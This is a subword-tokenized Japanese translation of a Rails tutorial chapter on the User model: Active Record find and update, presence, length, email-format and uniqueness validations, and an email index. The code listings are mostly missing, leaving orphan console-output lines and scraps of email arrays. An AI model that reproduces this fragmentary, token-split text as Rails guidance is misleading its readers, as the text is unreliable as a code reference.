▁ そして 、 保存 して 削除 されていない オブジェクト の場合 、 どう や って データベースから ユーザーを 取得 する の でしょう か 。
▁これらの 問 い に 答 え るために は 、 Active ▁Record を使って User オブジェクトを 検索 する方法について 学ぶ 必要があります 。
▁Active ▁Record には 、 オブジェクトを 検索 するための 方法 が い く つ もあります 。
▁これらの 機能 を使用して 、 過 去 に 作成した 最初の ユーザー を探し てみましょう 。 また 、 3 番目の ユーザー ▁(\ ko de { foo }) ▁ が 削除 されている ことを確認 しましょう 。
▁まずは 存 在 する ユーザー から 探 してみましょう 。
▁ここでは 、\ ko de { User . find } に ユーザーの id を渡して います 。 その 結果 、 Active ▁Record は その id のユーザー を返します 。
▁次に 、\ ko de { id } = \ ko de {3} の ユーザーが まだ データベースに 存 在 する かどうかを確認 してみましょう 。
▁ActiveRecord :: Re c or d No t F ound : ▁ Co ul d n ' t ▁ find ▁User ▁with ▁ ID = 3
▁\ ref { sec : creat ing _ user _ objects } で 3 番目の ユーザーを削除 した ので 、 Active ▁Record はこの ユーザーを データベース の中から 見つけ ること が できません で した 。
▁ 例外 と 例外 ハ ンド リ ング は 、 ある 意味 で Ruby の 高度な テ ー マ です 。 本書 では 例外 について これ 以上 言 及 しません 。
▁しかし 例外 が 重要な もの であること も 確 か なので 、\ ref { sec : guid e _ to _ f ur the r _ resources } で 推 薦 した Ruby 本 で 例外 について 詳 しく 学ぶ ことを お す す め します
▁ 一般的な \ ko de { find } メソッド 以外に 、 Active ▁Record には 特定の 属性 で ユーザー を検索する 方法 もあります 。
▁ これまで メールアドレスを ユーザー名 として 使用 し てきた ので 、 このような \ ko de { find } 関連 メソッドは 、 ユーザーを サイトに ログイン させる 方法 を学ぶ ときに 役 に 立 ち ます ▁( C ha p ter ~ \ ref { cha : sign _ up })。
▁ユーザー 数 が 膨 大 になる と \ ko de { find \_ by } では 検索 効率 が 低 下 する の では ない か と 心 配 する 方 も いる かもしれませんが 、 あ せる 必要はありません 。 この問題 および データベースの インデックス を使った 解決 策 については \ ref { sec : uniqueness _ validation } で 扱 います 。
▁ユーザー を検索する 一般的な 方法 を あ と 少し だけ ご 紹 介 して 、 この節 を 終わり にする ことにしましょう 。
▁ まず 初 め に \ ko de { first } メソッド です 。
▁ 読んで 字 の ご と く 、\ ko de { first } は 単 に データベース の最初の ユーザー を返します 。
▁ 次 は \ ko de { all } メソッド です 。
▁#< User ▁id : ▁ 2, ▁name : ▁" A ▁ N other ", ▁ email : ▁" an other @ example . org ", ▁ created _ at :
▁ い った ん オブジェクトを 作成 すれば 、 今度は 何 度 でも 更新 した くなる ものです 。
▁ 基本的な 更新 の 方法は 2 つ です 。
▁ ひとつ は 、\ ref { sec : a _ user _ class } で や った ように 属性を 個 別 に 代入 する方法 です 。
▁=> ▁" mhartl @ example . net "
▁ 変更 をデータベースに保存する ために 最後に save を実行する 必要がある ことを 忘れ ない で ください 。
▁ 保存 を 行 わ ずに \ ko de { reload } を実行すると 、 データベースの 情報 を元に オブジェクトを 再 読み込み する ので 、 以下のように 変更 が 取り 消 されます 。
▁=> ▁" foo @ bar . com "
▁\ ko de { update \_ attributes } メソッドは \ ko de { update } メソッドの エイリアス ですが 、 単 一 属性 を変更する \ ko de { update \_ attribute } メソッドと の違い を 明 確 に するために 、 筆者 は 長 い メソッド 名 の 方 を 好 んで 使 っています 。
▁=> ▁" The ▁D u de "
▁=> ▁" d u de @ a b id es . org "
▁\ ko de { update \_ attributes } メソッドは 属性 の ハッシュ を受け取り 、 成功 時に は 更新 と 保存 を 続けて 同時に 行います ▁( 保存 に成功した場合 は \ ko de { true } を返します )。
▁ただし 、 検証 に 1 つ でも 失敗する と 、 ▁\ ko de { update \_ attributes } の 呼び出し は 失敗 します 。 たとえば 、\ ref { sec : adding _ a _ secure _ password } で 実装 する 、 パスワードを レコード に保存 すること を 要求 すると 検証 は 失敗 します 。
▁ 特定の 属性 のみ を更新し たい場合は 、 以下のように \ ko de { update \_ attribute } を使います 。 なお 、 update \_ attribute には 検証 を 回 避 する といった 効果 もあります 。
▁ つ い に 、\ ref { sec : user _ model } で作成した User モデルに 、 アクセス 可能な \ ko de { name } と \ ko de { email } 属性 が与えられ ました 。 しかし 、 これらの 属性 は どんな 値 でも 取 ること が できてしまいます 。 現在 は ▁( 空 文字 を含む ) ▁ あらゆる 文字列 が 有効 です 。
▁ 名前 と メールアドレス には 、 もう少し 何らかの 制限 が あって よい はずです 。
▁たとえば 、\ ko de { name } は 空 で あって は な らず 、\ ko de { email } は メールアドレス の フォーマット に従う 必要があります 。
▁さらに 、 メールアドレスを ユーザーが ログイン する とき の 一意 の ユーザー名 として 使 お う と している ので 、 メールアドレス が データベース 内で 重複 すること の ないように する 必要 もあります 。
▁ 要 する に 、\ ko de { name } と \ ko de { email } に あらゆる 文字列を 許 す のは 避 け る べ き です 。 これらの 属性 値 には 、 何らかの 制 約 を与える 必要があります 。
▁Active ▁Record ▁ では \ emph { 検証 ▁( V al id ation ) } ▁という 機能 を通して 、 こういった 制 約 を 課 す ことができる ようになっています ▁( 実は \ ref { sec : put t ing _ the _ m i c r o _ in _ microposts } で 少し だけ 使って い ました )。
▁ここでは 、 よく 使われ る ケース のうち の いくつか について説明し ます 。 それら は \ emph { 存在性 ▁( presence ) } の 検証 、\ emph { 長さ ▁( length ) } の 検証 、\ emph { フォーマット ▁( format ) } の 検証 、\ emph { 一意性 ▁( uniqueness ) } の 検証 です 。
▁\ ref { sec : has _ secure _ password } では 、 よく 使われ る 最 終 検証 として \ emph { 確認 ▁( confirmation ) } を追加します 。
▁\ ref { sec : unsuccessful _ signup s } では 、 ユーザーが 制 約 に 違 反 したときに 、 検証 機能 によって自動的に 表示される 有 用 な エラーメッセージ を お 見 せ します 。
▁< n >< n >\ subsection { 有効 性 のテスト } ▁% ▁( fold )< n >\ label { sec : a _ valid ity _ test }< n >< n > A s ▁ not ed ▁in ▁B o x ~ \ ref { as id e : w h en _ to _ test } , ▁test - d r ive n ▁ development ▁is n ' t ▁ al w a y s ▁the ▁ right ▁to ol ▁for ▁the ▁ j o b , ▁ b u t ▁ model ▁ validations ▁are ▁ ex a ct ly ▁the ▁ k in d ▁of ▁f e at ur es ▁for ▁ w h i ch ▁ T D D ▁is ▁a ▁ per f e ct ▁f it .
▁ バリデーション 機能 は 強 力 ですが 、 うまく 動 い ている 自 信 を持つ の が 難 しい です 。 しかし 、 ( テスト駆動開発 のように ) ▁ まず 失敗する テストを 書き 、 次に テストを 成功 させる ように 実装 すると 、 期 待 した 通 り に 動 い ている 自 信 を 持 て る ようになります 。
▁ 具 体 的な テスト 方法 について ですが 、 まず \ emph { 有効な } モデルの オブジェクト を作成し 、 その 属性 のうち の 1 つ を 有効 でない 属性 に 意 図 的に 変更 します 。 そして 、 バリデーション で 失敗する かどうか をテストする 、 といった 方 針 で 進め ていきます 。
▁ 念 の ため 、 最初に 作成 時の 状態 に対して も テストを 書い て お き 、 最初の モデル が 有効 である かどうか も 確認 しておきます 。
▁この ように テスト することで 、 バリデーション の テストが 失敗した とき 、 バリデーション の実装 に 問題 が あった のか 、 オブジェクト そのもの に 問題 が あった のか を確認する ことができます 。
▁リスト \ ref { code : generate _ user _ model } の コマンド を実行して User 用 テスト の 原 型 が でき ている は ず なので 、 まず は その 中 身 から 見 て い き ましょう ▁( リスト \ ref { code : default _ user _ test })。
▁ デフォルトの User テスト ▁( モ ッ ク のみ )
▁ 有効な オブジェクト に対して テストを書く ために 、\ ko de { setup } という 特殊な メソッドを使って 有効な User オブジェクト ▁(\ ko de {@ user }) ▁ を作成します ▁( このメソッドは 第 \ ref { cha : static _ pages } 章 の 演習 でも 少し 取り上げ ました )。 setup メソッド 内に 書かれ た 処理 は 、 各 テストが 走 る 直 前に 実行されます 。 \ ko de {@ user } は インスタンス変数 ですが 、 setup メソッド 内で 宣言 しておけば 、 すべての テスト 内で この インスタンス変数 が 使えるようになります 。 したがって 、\ ko de { valid ?} メソッドを使って User オブジェクトの 有効 性 をテストする ことができます ▁(\ ref { sec : creat ing _ user _ objects }) . 。
▁作成した コードをリスト \ ref { code : valid _ user _ test } に示します
▁ 有効な User かどうか をテストする
▁リスト \ ref { code : valid _ user _ test } では 、 シンプルな \ ko de { assert } メソッドを使って テスト します 。 \ ko de {@ user . valid ?} が \ ko de { true } を返す と 成功 し 、\ ko de { false } を返す と 失敗 します 。
▁ とは い え 、 User モデルに はまだ バリデーション が ないので 、 この テストは 成功 するはずです 。
▁ 上で は \ ko de { rake ▁test : models } という コマンド を実行し ています が 、 これは モデル に関する テスト だけ を 走 ら せる コマンド です ▁(\ ref { sec : layout _ link _ tests } で 使 った \ ko de { rake ▁test : integration } と 似 ていることに注目してください )。
▁ おそらく 最も 基本的な バリデーション は 「\ emph { 存在性 ▁( P re s en ce ) }」 です 。 これは 単 に 、 与えられた 属性 が存在する ことを 検証 します 。
▁たとえば この節 では 、 ユーザーが データベースに保存 される 前に name と email フィールド の 両方 が存在する ことを 保 証 します 。
▁\ ref { sec : signup _ error _ messages } では 、 この 要求 を 新しい ユーザーを 作る ための ユーザー登録フォーム に まで 徹 底 させる 方法 を 確認 します 。
▁まずは リスト \ ref { code : valid _ user _ test } に 、 ▁\ ko de { name } 属性 の 存在性 に関する テスト を追加します 。
▁ 具体的には リスト \ ref { code : name _ presence _ test } のように 、 まず \ ko de {@ user } 変数 の \ ko de { name } 属性 に対して 空白 の 文字列を セット します 。 そして 、\ ko de { assert \_ not } メソッドを使って ▁User オブジェクトが 有効 で なく な った ことを確認します 。
▁\ ko de { name } 属性 に バリデーション に対するテスト
▁ 第 \ ref { cha : a _ toy _ app } 章 の 演習 で 少し 触 れ ましたが 、 name 属性 の 存 在 を 検 査 する方法 は 、 リスト \ ref { code : validates _ presence _ of _ name } に示した とおり 、\ ko de { validates } ▁ メソッド に \ ko de { presence : ▁true } という 引数 を与えて 使う ことです 。
▁\ ko de { presence : ▁true } という 引数 は 、 要素 が ひとつ の \ emph { オプション ハッシュ } です 。 \ ref { sec : css _ re v is it ed } のように メソッドの 最後の 引数として ハッシュ を 渡す 場合 、 波 括 弧 を 付け なくても 問題 ありません
▁(\ ref { sec : adding _ to _ the _ layout } でも 説明したように 、 Rails の オプション ハッシュ は 繰り返し 登 場 する テ ー マ です )。
▁\ ko de { name } 属性 の 存在性 を検証する
▁リスト \ ref { code : validates _ presence _ of _ name } は 一 見 魔 法 のように 見え る かもしれませんが 、\ ko de { validates } は 単なる メソッド です 。
▁ 括 弧 を使用して リスト \ ref { code : validates _ presence _ of _ name } を 同 等 のコード に 書き 換 え た もの を以下に示します 。
▁ コンソール を 起動 して 、 User モデルに 検証 を追加した 効果 を見てみましょう
▁ 今後 、 コンソール コマンド の 出力 は 、 特に 教 育 的 効果 が 高 い と 思える 場合 ▁( ここで の \ ko de { User . new } の場合 など ) ▁ を 除 いて 省略 いた します 。
▁=> ▁false
▁この ように 、\ ko de { user } 変数 が 有効 かどうかを \ ko de { valid ?} メソッドで チェック することができます 。 も し オブジェクトが ひとつ 以上 の 検証 に 失敗した とき は 、\ ko de { false } を返します 。 ▁また 、 すべての バリデーション に 通 った ときに \ ko de { true } を返します 。
▁ 今回の 場合 、 検証 が 1 つ しか ないので 、 どの 検証 が 失敗した か わかり ます 。 しかし 、 失敗した ときに 作 られ る \ ko de { errors } オブジェクト を使って 確認 すれば 、 さらに 便利です 。
▁( Rails が 属性 の 存在性 を 検 査 するときに 、 エラーメッセージ は ヒント になります 。 これ には \ ko de { blank ?}
▁ メソッドを 用 います 。 \ ref { sec : mod if y ing _ b u il t _ in _ classes } の 終わり に 見 ました )。
▁User オブジェクトは 有効 ではなく な った ので 、 データベースに保存 し よう と すると 自動的に 失敗 するはずです 。
▁この 変更 により リスト \ ref { code : name _ presence _ test } のテスト は ▁\ passing ▁ している はずです 。
▁リスト \ ref { code : name _ presence _ test } の モデルに 倣 って 、\ ko de { email } 属性 の 存在性 についても テストを 書い てみましょう ▁( リスト \ ref { code : email _ presence _ test })。 最 初 は 失敗 します が 、 リスト \ ref { code : validates _ presence _ of _ email } のコード を追加する ことで 成功 する ようになります 。
▁\ ko de { email } 属性 の 検証 に対するテスト
▁\ ko de { email } 属性 の 存在性 を検証する
▁これで すべての 存在性 が チェック された ので 、 テストスイート は ▁\ passing ▁ するはずです 。
▁ 各 ユーザー は 、 User モデル 上 に 名前 を持つ ことを 強 制 される ようになりました 。 しかし 、 これ だけで は 十分 ではありません 。 ユーザーの 名前 は サンプル Web サイトに 表示される もの なので 、 名前 の 長さ にも 制限 を与える 必要があります 。
▁\ ref { sec : presence _ validation } で 既に 同じ ような 作業 を 行った ので 、 この 実装 は 簡単 です 。
▁ 最 長 の ユーザー名 の 長さ に 科 学 的な 根 拠 はありません ので 、 単 に \ ko de { 50 } を 上 限 として 手 頃 な 値 を使う ことにします 。 つまり ここでは 、\ ko de { 5 1 } 文字 の名前 は 長 すぎる ことを 検証 します 。
▁また 、 実際に 問題 になる ことは ほとんど ありません が 、 問題 になる 可能性 も あるので 長 すぎる メールアドレス に対して も バリデーション を 掛 け ましょう 。 ほとんど の データベース では 文字列 の 上 限 を 2 5 5 と している ので 、 それ に合わせて 2 5 5 文字 を 上 限 とします 。
▁\ ref { sec : format _ validation } で 説明 する メールアドレス の フォーマット に関する バリデーション では 、 こういった 長さ の 検証 は できない ので 、 本 節 で 長さ に関する バリデーション を 事 前に 追加 しておきます 。
▁ 結果を リスト \ ref { code : length _ validation _ test } に示します 。
▁\ ko de { name } の 長さ の 検証 に対するテスト
▁リスト \ ref { code : length _ validation _ test } では 、 5 1 文字 の 文字列 を簡単に 作る ために ▁“ 文字列 の かけ 算 ” ▁ を 使い ました 。
▁ 結果を コンソール 上で 確認 できます 。
▁=> ▁" a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a "
▁=> ▁5 1
▁ メールアドレス の 長さ に対する バリデーション も 、 次のように 長 い 文字列 を作成して 検証 します 。
▁=> ▁" a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a < n > a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a
▁ これを パス させる ためには 、 長さ を 強 制 するための 検証 の 引数 を使う 必要があります 。 \ ko de { : ma x im um } パラメータ と 共 に 用 い られ る \ ko de { : length } は 、 長さ の 上 限 を 強 制 します ▁( リスト \ ref { code : length _ validation })。
▁\ ko de { name } 属性 に 長さ の 検証 を追加する
▁これで テストが ▁\ passing ▁ になるはずです 。
▁ 成功 した テストスイート を 流 用 して 、 今度は 少し 難 しい 、 メールアドレス の フォーマット 検証 作業 に 取り か か り ましょう 。
▁\ ko de { name } 属性 の 検証 には 、 空 文字 でない 、 名前 が 5 1 文字 未 満 である という 最 小 限 の 制 約 しか 与え て いません で した 。 \ ko de { email } 属性 の場合は 、 有効な メールアドレス かどうかを 判 定 するために 、 もっと 厳 重 な 要求 を 満 た さ なければなりません 。
▁ これまで は 空 の メールアドレス のみ を 禁 止 し てきました が 、 ここでは メールアドレス に お な じ み の パターン \ ko de { user @ example . com } に 合 っている かどうか も 確認 すること を 要求 します 。
▁なお 、 ここで 使用する テスト や 検証 は 、 形式 が ひ と まず 有効な メールアドレスを 受け 入 れ 、 形式 が あ から さ ま に 無効な もの を 拒 否 する だけ であり 、 すべての 場合 を 網羅 した もの では ない という 点に注意 してください 。
▁最初に 、 有効な メールアドレス と 無効な メールアドレス の コレクション に対するテスト を行い ましょう 。
▁この コレクション を 作る ために 、 以下の コンソール セッション に示した ような 、 文字列 の配列 を簡単に 作 れる \ ko de { \ % w [ ]} という 便利な テクニック を 知 っ ておく と 良い でしょう 。
▁=> ▁[" foo ", ▁" bar ", ▁" baz "]
▁C O M ▁ THE _ U S - ER @ foo . bar . org ▁ first . last @ foo . j p ]
▁C O M ", ▁" THE _ U S - ER @ foo . bar . org ", ▁" first . last @ foo . j p "]
▁ THE _ U S - ER @ foo . bar . org
▁ first . last @ foo . j p
▁\ ko de { each } メソッドを使って \ ko de { address es } 配列 の 各 要素 を 繰り返し 取り出し ました ▁(\ ref { sec : block s })。
▁この テクニック を 学 んだ ことで 、 基本 となる メールアドレス フォーマット 検証 の テストを書く 準備 が 整 い ました 。
▁ メールアドレス のバリデーション は 扱 い が 難 しく 、 エラーが発生し やすい 部分 なので 、\ emph { 有効な } メールアドレス と 無効な メールアドレスを いくつか 用 意 して 、 バリデーション � 内の エラー を 検 知 していきます 。
▁ 具体的には 、\ emph { user @ example , com } のような 無効な メールアドレス が 弾 か れ ること と 、\ emph { user @ example . com } のような 有効な メールアドレス が 通 る ことを確認 し ながら 、 バリデーション を 実装 していきます
▁( ちなみに 今 の 状態 では 、 空 でない メールアドレス であれば 全 て 通 ってしまいます ) ▁ 。
▁まずは 、 有効な メールアドレスを リスト \ ref { code : email _ format _ valid _ tests } に示します 。
▁ 有効な メール フォーマット をテストする
▁ここでは 、 assert メソッドの 第 2 引数に エラーメッセージ を追加し ていることに注目してください 。 これ によって 、 どの メールアドレス で テストが 失敗した のか を 特 定 できるようになります 。
▁( 詳 細 な 文字列 を調べ るために \ ref { sec : hash es _ and _ symbol s } で紹介した \ ko de { in spec t } メソッド を使っています 。 )
▁ どの メールアドレス で 失敗した のか を 知 ること は 非常に 便利です 。 そこで リスト \ ref { code : email _ format _ valid _ tests } では 、\ ko de { each } メソッドを使って 各 メールアドレスを 順に テスト しています 。 ル ー プ さ せずに テスト すると 、 失敗した 行 番号 から と メールアドレス の 行 数 を 照 ら し 合わせ て 、 失敗した メールアドレスを 特 定 する といった 作業 が発生し てしまいます 。
▁リスト \ ref { code : email _ format _ valid _ tests } と同様に 、 リスト \ ref { code : email _ format _ validation _ tests } でも エラーメッセージ を カスタマイズ して 、 どの メールアドレス で 失敗した のか すぐ に 特 定 できるように しておきます 。 ▁ include s ▁a ▁ custom ▁ error ▁ message ▁to ▁id ent if y ▁the ▁ ex a ct ▁ address ▁ ca us ing ▁ any ▁ failure .
▁ メール フォーマット の 検証 に対するテスト ▁( ▁\ failing ▁ )
▁ foo @ bar _ baz . com ▁ foo @ bar + baz . com ]
▁ メールアドレス の フォーマット を検証する ためには 、 次のように \ ko de { format } という オプション を使います 。
▁この オプションは 引数に \ emph { 正規表現 ▁( Re g ul ar ▁ E x pre s s ion ) } ▁(\ emph { re g ex } とも 呼ばれ ます ) ▁ を 取り ます 。 正規表現 は 一 見 謎 め いて 見え ます が 、 文字列 の パターン マッチ ング において は 非常に 強力な 言語 です 。
▁つまり 、 有効な メールアドレス だけ に マッチ して 、 無効な メールアドレス には \ emph { マッチ しない } 正規表現 を 組 み 立 て る必要があります 。
▁( 完全な 正規表現 )
▁ 驚 いた ことに 公式 標準 による と 、 たとえば \ ko de { " Michael ▁Hartl " example . com } のような ク ォ ート と スペース を使用した メールアドレス も 有効な の だ そう です 。
▁ まったく 馬鹿 げ ています 。
▁これ が 、 その 正規表現 です 。
▁この 正規表現 を理解する ために 、 お 手 頃 な サイズ に 分割 して 表 \ ref { table : valid _ email _ re g ex } に まとめ ました
▁ 表 \ ref { table : valid _ email _ re g ex } の 正規表現 の 説明 における 「 文字 」 は 、 実は 「 小文字 のみ 」 が 対象 になっている ことに注意してください 。 ただし 、 正規表現 の 末尾 に \ ko de { i } オプション を追加して あるので 、 大文字 小文字 が 区別 され ずに マッチする ようになっています 。
▁ 正規表現 の 開 始 を 示す
▁ 文字列 の 先 頭
▁ 英 数字 、 アンダースコア ▁(\ _ ) 、 プ ラ ス ▁( + ) 、 ハ イ フ ン ▁( - ) 、 ドット ▁( . ) ▁ のいずれか を 少なくとも 1 文字 以上 繰り返す
▁ ア ッ ト マーク
▁ 英 小文字 、 数字 、 ハ イ フ ン 、 ドット のいずれか を 少なくとも 1 文字 以上 繰り返す
▁ ドット
▁ 英 小文字 を 少なくとも 1 文字 以上 繰り返す
▁ 文字列 の 末尾
▁ 正規表現 の 終わり を 示す
▁ 大文字 小文字 を 無視 する オプション
▁ メールの 正規表現 を 分 解 した 結果
▁ 表 \ ref { table : valid _ email _ re g ex } から も 多くの ことを 学 べ ると は 思い ます が 、 正規表現 を 本当に 理解 するために は 実際に 使って 見 る の が 一 番 です 。 たとえば \ href { http :// www . r ub ul ar . com /}{ R ub ul ar } という 対 話 的に 正規表現 を 試 せる Web サイト があります ▁( 図 \ ref { fig : r ub ul ar })
▁ も し R ub ul ar の サービス が 便 利 だと 思 った ら 、 素晴らしい 功 績 を 残 した 開発者 である \ href { http :// b it . ly / do n at e - to - r ub ul ar } { Michael ▁ L o v i tt } さ ん に 報 い るために \ href { http :// lo v i tt . net /}{ R ub ul ar への 寄 付 } を お勧め します . 。
▁この Web サイト は イン タ ラ ク テ ィ ブ 性 に 富 んだ インターフェイス を 持 って いて 、 また 、 正規表現 の ク イ ッ ク リ フ ァ レ ン ス も 兼 ね 備 え ています 。
▁ R ub ul ar を ブラウザで 開 き 、 表 \ ref { table : valid _ email _ re g ex } の内容 を 実際に 試 してみる ことを 強 く お勧め します 。 正規表現 は 、 読んで 学ぶ より 対 話 的に 学 んだ ほ う が 早 い です 。
▁ 素晴らしい 正規表現 エディタ \ href { http :// www . r ub ul ar . com /}{ R ub ul ar }
▁ 表 \ ref { table : valid _ email _ re g ex } の 正規表現 を 適 用 して \ ko de { email } の フォーマット を 検証 した 結果を 、 リスト \ ref { code : validates _ format _ of _ email } に示します 。
▁ メール フォーマット を 正規表現 で 検証 する
▁ 正規表現 \ ko de { V A L ID \_ E M A I L \_ RE G E X } は \ emph { 定数 } です 。 大文字 で 始 ま る 名前 は Ruby では 定数 を 意味 します 。
▁この パターン に 一致する メールアドレス だけ が 有効 であることを チェック します
▁上の 正規表現 には 少し だけ 残 念 な 点 があります 。 \ ko de { foo @ bar . . com } のような ドット の 連 続 を 誤 り として 検出 できません 。
▁ この問題 の 修正 するには と て つ も なく 複雑な 正規表現 を使う 必要があります が 、 これは 演習 問題 に 回 します ▁(\ ref { sec : modeling _ users _ exercises })。
▁ 残 る 制 約 は 、 メールアドレス が 一意 であることを 強 制 する こ だけ と なりました 。
▁ メールアドレス の 一意性 を 強 制 するために ▁( ユーザー名 として 使う ために ) 、\ ko de { validates } メソッドの \ ko de { : un i que } オプション を使います 。
▁ただし ここで \ emph { 重 大 な } 警 告 があります 。 以下の 文 面 は 流 し 読み せ ず 、 必ず 注意 深 く 読んで ください 。
▁まずは 小さな テスト から 書い ていきます 。
▁ モデルの テストでは これまで 、 主 に \ ko de { User . new } を使って き ました 。 このメソッドは 単 に メモリ 上 に Ruby の オブジェクトを 作る だけです 。 しかし 、 一意性 のテスト の ためには 、 メモリ 上 だけ ではなく 、 実際に レコード を データベースに 登録 する必要があります
▁ この節 の 冒 頭 で 簡単に 紹 介 した ように 、 この 目的 に 使用できる 専 用の テスト データベース \ ko de { db / test . sqlite 3 } があります 。
▁ そのため 、 まず は 重複 した メールアドレス から テスト していきます ▁( リスト \ ref { code : validates _ uniqueness _ of _ email _ test })。
▁ 重複 する メールアドレス 拒 否 のテスト
▁上のコードでは 、\ ko de {@ user } と同じ メールアドレス のユーザー は 作成 できない ことを 、\ ko de {@ user . dup } を使って テスト しています 。 dup は 、 同じ 属性 を持つ データを 複 製 するための メソッド です 。
▁\ ko de {@ user } を保存し た 後 では 、 複 製 された ユーザーの メールアドレス が 既に データベース 内に 存 在 する ため 、 ユーザ の作成 は 無効 になるはずです 。
▁リスト \ ref { code : validates _ uniqueness _ of _ email _ test } のテスト を パス させる ために 、\ ko de { email } のバリデーション に \ ko de { uniqueness : ▁true } という オプション を追加します ▁リスト \ ref { code : validates _ uniqueness _ of _ email } 。
▁ メールアドレス の 一意性 を検証する ▁( ▁\ passing ▁ )
▁ 実装 の 途 中 ですが 、 ここで ひとつ 補 足 します 。
▁ 技術 的に は 、 メールアドレス のうち ドメイン 名 部分 だけ が ▁( 本 当 は ) ▁ 大文字 小文字 を 区別 しません 。 \ emph { foo @ bar . com } は 、 本 来 は \ emph { F oo @ bar . com } とは 別の アドレス です 。
▁ただし 現 実 的に は 、\ href { http :// email . about . com / o d / email b e h in d the sc en es / f / email _ case _ s en s . h t m } { about . com } でも 指 摘 されている ように 、 メールアドレス の 大文字 小文字 を 区別 すること を 前 提 にする のは まず い 方法 です 。 「 メールアドレス の 大文字 小文字 を 区別 すると 、 果 て しない 混 乱 と 相 互 運 用 性 の 問題 と ひ ど い 頭 痛 が発生する 。 メールアドレス の 入力 時に 大文字 小文字 の 区別 を 要求 する のは 賢 い 方法 とは 言 え ない 。
▁ 現 実 には 、 メールアドレス の 大文字 小文字 の 区別 を 強 制 する メール サービス や I S P は め った に 存在しない 。 メールアドレス の すべての 文字 を 大文字 にする など 、 受信 者 の メールアドレス が 誤 って 入力 され ていれば 、 メール は 返 送 される だけ だ 。 」
▁ R il e y ▁ M o s es による ご 指 摘 に 感 謝 いた します 。
▁ このため 、 大文字 を 区別 しない で テスト すること が 肝 要 になり 、 実際の コードは リスト ▁\ ref { code : validates _ uniqueness _ of _ email _ case _ in s en s it ive _ test } のようになります 。
▁ 大文字 小文字 を 区別 しない 、 一意性 のテスト ▁( ▁\ failing ▁ )
▁上のコードでは String の \ ko de { up case } メソッド を使っています ▁(\ ref { sec : block s })。
▁この テストは 最初の メールアドレス の 重複 テスト と同じ ことを しています が 、 大文字 に変換 した メールアドレスを 使っている 点が 異なります 。
▁ も し この テストが 少し 抽 象 的 すぎる と 感 じ る なら 、 Rails コンソール を 起動 して 確認 しましょう 。
▁=> ▁" U S ER @ E X A M P L E . C O M "
▁ 幸 い 、\ ko de { : uniqueness } では \ ko de { : case \_ s en s it ive } という 打 って つ け の オプション が 使用できます ▁( リスト \ ref { code : validates _ uniqueness _ of _ email _ case _ in s en s it ive } })。
▁ メールアドレス の 大文字 小文字 を 無視 した 一意性 の 検証 ▁( ▁\ passing ▁ )
▁ これはリスト \ ref { code : validates _ uniqueness _ of _ email _ case _ in s en s it ive } で使用されていま した 。
▁Rails は この場合 、\ ko de { : uniqueness } を \ ko de { true } と 判 断 します 。
▁ この時点で 、 アプリケーション は 重要な 警 告 と 共 に メールアドレス の 一意性 を 強 制 し 、 テストスイート も パス するはずです 。
▁しかし 、 依 然 として ここに は 1 つの 問題 が 残 っています 。 それ は \ emph { Active ▁Record は データベースの レベル では 一意性 を 保 証 していない } という 問題 です 。
▁ 具 体 的な シ ナ リ オ を使って その 問題 を 説明します 。
▁ ア リ ス は サンプルアプリケーション に ユーザー登録 します 。 メールアドレス は a li ce @ w o nder l and . com です 。
▁ ア リ ス は 誤 って ▁“ S ub m it ” ▁ を 素 早 く \ emph { 2 回 } クリック し てしまいます 。 そのため リクエスト が 2 つ 連 続 で 送信 されます 。
▁ 次のような ことが 順に 発生 します 。 リクエスト 1 は 、 検証 に パス する ユーザーを メモリ ー 上 に 作成 します 。 リクエスト 2 でも 同じ ことが 起 きます 。 リクエスト 1 の ユーザーが 保存 され 、 リクエスト 2 のユーザー も 保存されます 。
▁この 結果 、 一意性 の 検証 が 行われている にも か か わ らず 、 同じ メールアドレス を持つ 2 つの ユーザー レコード が作成され てしまいます 。
▁上の シ ナ リ オ が 信 じ が たい もの のように 思える かもしれませんが 、 どう か 信 じ てください 。 Rails の Web サイト では 、 ト ラ フ ィ ッ ク が多い ときに このような 問題 が発生する 可能性 がある のです ▁( 筆者 も これ を理解する の に 苦 労 しました )。
▁ 幸 い 、 解決 策 の実装 は 簡単 です 。 実は 、 この問題 は データベース レベル でも 一意性 を 強 制 する だけで 解決 します 。
▁ データベースの インデックス
▁ データベースに カラム を作成する とき 、 その カラム で レコード を \ emph { 検索 する ▁( find ) ▁ } 必要がある かどうかを 考え ること は 重要です 。
▁たとえば 、 リスト \ ref { code : users _ migration } の マイグレーション によって 作成された ▁\ text tt { email } 属性 について 考えてみましょう 。
▁ 第 \ ref { cha : sign _ up } 章では ユーザーを サンプル アプリ に ログイン できるようにします が 、 このとき 、 送信された もの と 一致する メールアドレス の ユーザーの レコード を データベース の中から 探 し だ す 必要があります 。
▁これは 、 データベースの 世界 では \ emph { 全 表 ス キ ャ ン } として 知 られ ており 、 数 千 の ユーザーが いる 実際の サイト では \ href { http :// cat b . org / j ar g on / html / B / B ad - T h ing . html } { 極めて 不 都 合 } です 。
▁ email カラム に インデックス を追加する ことで 、 この問題 を 解決 することができます 。
▁ データベースの インデックス を理解する ためには 、 本 の 索 引 と の 類 似 性 を 考え ると よいでしょう 。
▁ 索 引 の ない 本 では 、 与えられた 言 葉 ▁( 例 えば 、 “ foo bar ” ) ▁ が 出 て く る 箇所 をすべて 見つけ るために は 、 ページを 端 から 順に め く って 最 後 まで 探 す 必要があります ▁( 紙 バージョンの 全 表 ス キ ャ ン )。
▁しかし 索 引 のある 本 であれば 、 “ foo bar ” を含む すべての ページを 索 引 の中から 探 す だけで 済み ます 。
▁ データベースの インデックス も 本 質 的に は 本 の 索 引 と同じ ように 動作します 。
▁ email インデックス を追加する と 、 データ モデリング の 変更 が 必要 になります 。 Rails では ▁(\ ref { sec : database _ migration s } で 見 た ように ) ▁ マイグレーション で インデックス を追加します 。
▁\ ref { sec : database _ migration s } で 、 User モデル を生成する と 自動的に 新しい マイグレーション が 作成された ことを思い出してください ▁( リスト \ ref { code : users _ migration })。 今回の 場合は 、 既に 存 在 する モデルに 構造 を追加する ので 、 以下のように \ ko de { migration } ジェネレータ ー を使用して マイグレーション を直接 作成する必要があります 。
▁ユーザー 用の マイグレーション と異なり 、 メールアドレス の 一意性 の マイグレーション は 未 定義 になっています 。 リスト \ ref { code : email _ uniqueness _ index } のように 定義 を 記述 する必要があります
